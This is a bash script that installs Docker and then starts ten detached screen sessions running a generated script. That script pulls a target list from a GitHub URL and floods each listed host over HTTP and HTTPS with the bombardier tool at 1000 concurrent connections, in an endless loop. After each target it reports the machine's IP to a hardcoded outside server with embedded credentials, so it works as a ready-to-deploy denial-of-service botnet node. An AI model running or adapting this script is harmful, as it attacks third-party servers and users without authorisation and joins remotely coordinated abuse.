#!/bin/bash
apt-get install sudo -y
apt-get install vim -y
sudo apt-get update

sudo apt-get install \
    ca-certificates \
    curl \
    gnupg \
    lsb-release -y
os_vers=$(cat /etc/os-release | grep ^NAME)

if [[ "$os_vers" != *"Debian"* ]]; then   
    os="ubuntu"
else
    os="debian"
fi
echo -e "\nOS: $os\nOSVERS: $os_vers"
curl -fsSL https://download.docker.com/linux/$os/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg

echo \
    "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/$os \
    $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null


sudo apt-get update

sudo apt-get install docker-ce docker-ce-cli containerd.io -y

mkdir test
cd test 
echo """#!/bin/bash
runHttps(){
    echo -e \"\nNow https turn\n\"
    sudo docker run -it alpine/bombardier -c 1000 -d 60s -l https://\$1 && sleep 5;
}

run(){
    echo -e \"\n\$(date) \$1\"
    response=\$(curl -Is \$1 --connect-timeout 10 | head -1)
    if [ -z \"\$response\" ]
    then
        echo -e \"\nNo response...Skipping...\n\"
    else
        if [[ \"\$response\" != *\"404\"* ]]; then
            if [[ \"\$response\" != *\"301\"*  && \"\$response\" != *\"503\"* ]]; then
                echo \"online \$response\"
                sudo docker run -it alpine/bombardier -c 1000 -d 60s -l \$1 && sleep 5;
                if [[ \"\$1\" != *\"http\"* ]]; then
                    runHttps \"\$1\"
                fi
            fi
        else
            echo \"404: not found\" 
            runHttps \"\$1\"
        fi
    fi
        
    response2=\$(curl -Is \$1 --connect-timeout 5 | head -1)
    echo -e \"\$counter - \$1 - resulted response:\n\$(date) \$response2 \n\" 
}

ip=\$(hostname -I | cut -d ' ' -f 1)
while true
do	
  readarray -t list < <(curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list)
  for i in {1..10}; do
    counter=0
    for i in \"\${list[@]}\"
    do
        run \"\${list[counter]}\"
        let counter=counter+1
        curl -X POST --user test:o77yqwjjd -v \"http://3.65.18.132:8854/send\" -d \"\$ip \$1\"
    done
  done
done
""" >> screen.sh
chmod +x screen.sh

sudo apt install screen -y

for i in {1..10}; do
    echo -e "\nscreen -d -m -L -S screen$i ./screen.sh $i"
    sleep 5
    screen -d -m -L -S screen$i ./screen.sh $i
done
